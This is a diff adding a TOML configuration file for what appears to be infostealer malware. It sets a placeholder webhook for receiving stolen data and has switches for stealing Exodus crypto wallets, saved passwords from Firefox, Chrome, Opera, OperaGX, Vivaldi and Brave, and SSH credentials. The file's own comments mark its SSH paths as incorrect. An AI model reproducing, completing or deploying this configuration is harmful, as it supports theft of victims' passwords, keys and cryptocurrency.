@@ -1,0 +1,22 @@
+webhook = "INSERT_YOUR_WEBHOOK_HERE"
+
+[features]
+steal_crypto_wallets = false    # This will steal crypto wallets such as Exodus and others.
+steal_browser_passwords = false # Will steal passwords from browsers.
+steal_shh_credentials = false   # Will steal credentials from ssh.
+
+[features.browsers]
+# You can add more browsers here, if they are supported.
+browser_to_steal = ["Firefox", "Chrome", "Opera", "OperaGX", "Vivaldi", "Brave"]
+
+[features.crypto]
+# You can add more crypto wallets here, if they are supported.
+wallets = ["Exodus"]
+
+[features.ssh]
+
+[features.ssh.linux]
+path = "/etc/ssh/sshd_config" # TODO: CHANGE THIS, THIS IS INCORRECT.
+
+[features.ssh.windows]
+path = "C:\\Windows\\System32\\drivers\\etc\\hosts" # TODO: CHANGE THIS, THIS IS INCORRECT.
